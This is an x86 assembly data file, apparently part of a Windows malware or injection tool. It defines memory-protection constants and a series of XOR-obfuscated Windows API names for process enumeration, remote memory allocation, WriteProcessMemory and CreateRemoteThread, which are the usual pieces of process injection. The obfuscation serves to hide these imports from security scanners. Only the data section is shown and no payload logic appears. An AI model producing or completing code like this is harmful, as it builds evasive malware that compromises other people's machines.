TH32CS_SNAPPROCESS equ 0x2
PROCESS_ALL_ACCESS equ 0x1fffff

MEM_RESERVE equ 0x2000 
MEM_COMMIT equ 0x1000 
MEM_RELEASE equ 0x8000 

PAGE_READWRITE equ 0x04
PAGE_EXECUTE equ 0x10
PAGE_EXECUTE_READ equ 0x20
PAGE_EXECUTE_READWRITE equ 0x40

FILE_APPEND_DATA equ 0x4
FILE_SHARE_READ equ 0x1
OPEN_ALWAYS equ 0x4
FILE_ATTRIBUTE_NORMAL equ 0x80

xor_key: db '00000', 0
.len equ $ - xor_key - 1

kernel32_xor: db 0x5b, 0x55, 0x42, 0x5e, 0x55, 0x5c, 0x3, 0x2, 0x1e, 0x54, 0x5c, 0x5c, 0
.len equ $ - kernel32_xor - 1

get_last_error_xor: db 0x77, 0x55, 0x44, 0x7c, 0x51, 0x43, 0x44, 0x75, 0x42, 0x42, 0x5f, 0x42, 0
.len equ $ - get_last_error_xor - 1

get_proc_addr_xor: db 0x77, 0x55, 0x44, 0x60, 0x42, 0x5f, 0x53, 0x71, 0x54, 0x54, 0x42, 0x55, 0x43, 0x43, 0
.len equ $ - get_proc_addr_xor - 1

load_library_a_xor: db 0x7c, 0x5f, 0x51, 0x54, 0x7c, 0x59, 0x52, 0x42, 0x51, 0x42, 0x49, 0x71, 0
.len equ $ - load_library_a_xor - 1

get_module_handle_a_xor: db 0x77, 0x55, 0x44, 0x7d, 0x5f, 0x54, 0x45, 0x5c, 0x55, 0x78, 0x51, 0x5e, 0x54, 0x5c, 0x55, 0x71, 0
.len equ $ - get_module_handle_a_xor - 1

get_current_process_xor: db 0x77, 0x55, 0x44, 0x73, 0x45, 0x42, 0x42, 0x55, 0x5e, 0x44, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0
.len equ $ - get_current_process_xor - 1

get_std_handle_xor: db 0x77, 0x55, 0x44, 0x63, 0x44, 0x54, 0x78, 0x51, 0x5e, 0x54, 0x5c, 0x55, 0
.len equ $ - get_std_handle_xor - 1

open_process_xor: db 0x7f, 0x40, 0x55, 0x5e, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0
.len equ $ - open_process_xor - 1

create_file_a_xor: db 0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x76, 0x59, 0x5c, 0x55, 0x71, 0
.len equ $ - create_file_a_xor - 1

write_file_xor: db 0x67, 0x42, 0x59, 0x44, 0x55, 0x76, 0x59, 0x5c, 0x55, 0x0
.len equ $ - write_file_xor - 1

virtual_alloc_ex_xor: db 0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x71, 0x5c, 0x5c, 0x5f, 0x53, 0x75, 0x48, 0
.len equ $ - virtual_alloc_ex_xor - 1

virtual_free_ex_xor: db 0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x76, 0x42, 0x55, 0x55, 0x75, 0x48, 0
.len equ $ - virtual_free_ex_xor - 1

read_process_memory_xor: db 0x62, 0x55, 0x51, 0x54, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x7d, 0x55, 0x5d, 0x5f, 0x42, 0x49, 0x0
.len equ $ - read_process_memory_xor - 1

write_process_memory_xor: db 0x67, 0x42, 0x59, 0x44, 0x55, 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x7d, 0x55, 0x5d, 0x5f, 0x42, 0x49, 0
.len equ $ - write_process_memory_xor - 1

virtual_protect_xor: db 0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x60, 0x42, 0x5f, 0x44, 0x55, 0x53, 0x44, 0
.len equ $ - virtual_protect_xor - 1

virtual_protect_ex_xor: db 0x66, 0x59, 0x42, 0x44, 0x45, 0x51, 0x5c, 0x60, 0x42, 0x5f, 0x44, 0x55, 0x53, 0x44, 0x75, 0x48, 0
.len equ $ - virtual_protect_ex_xor - 1

create_remote_thread_xor: db 0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x62, 0x55, 0x5d, 0x5f, 0x44, 0x55, 0x64, 0x58, 0x42, 0x55, 0x51, 0x54, 0
.len equ $ - create_remote_thread_xor - 1

wait_for_single_object_xor: db 0x67, 0x51, 0x59, 0x44, 0x76, 0x5f, 0x42, 0x63, 0x59, 0x5e, 0x57, 0x5c, 0x55, 0x7f, 0x52, 0x5a, 0x55, 0x53, 0x44, 0
.len equ $ - wait_for_single_object_xor - 1

close_handle_xor: db 0x73, 0x5c, 0x5f, 0x43, 0x55, 0x78, 0x51, 0x5e, 0x54, 0x5c, 0x55, 0
.len equ $ - close_handle_xor - 1

create_toolhelp32_snapshot_xor: db 0x73, 0x42, 0x55, 0x51, 0x44, 0x55, 0x64, 0x5f, 0x5f, 0x5c, 0x58, 0x55, 0x5c, 0x40, 0x3, 0x2, 0x63, 0x5e, 0x51, 0x40, 0x43, 0x58, 0x5f, 0x44, 0
.len equ $ - create_toolhelp32_snapshot_xor - 1

process32_first_xor: db 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x3, 0x2, 0x76, 0x59, 0x42, 0x43, 0x44, 0
.len equ $ - process32_first_xor - 1

process32_next_xor: db 0x60, 0x42, 0x5f, 0x53, 0x55, 0x43, 0x43, 0x3, 0x2, 0x7e, 0x55, 0x48, 0x44, 0
.len equ $ - process32_next_xor - 1

sleep_xor: db 0x63, 0x5c, 0x55, 0x55, 0x40, 0x0
.len equ $ - sleep_xor - 1

output_debug_string_a_xor: db 0x7f, 0x45, 0x44, 0x40, 0x45, 0x44, 0x74, 0x55, 0x52, 0x45, 0x57, 0x63, 0x44, 0x42, 0x59, 0x5e, 0x57, 0x71, 0
.len equ $ - output_debug_string_a_xor - 1

dll_xor: db 0x1e, 0x54, 0x5c, 0x5c, 0
.len equ $ - dll_xor - 1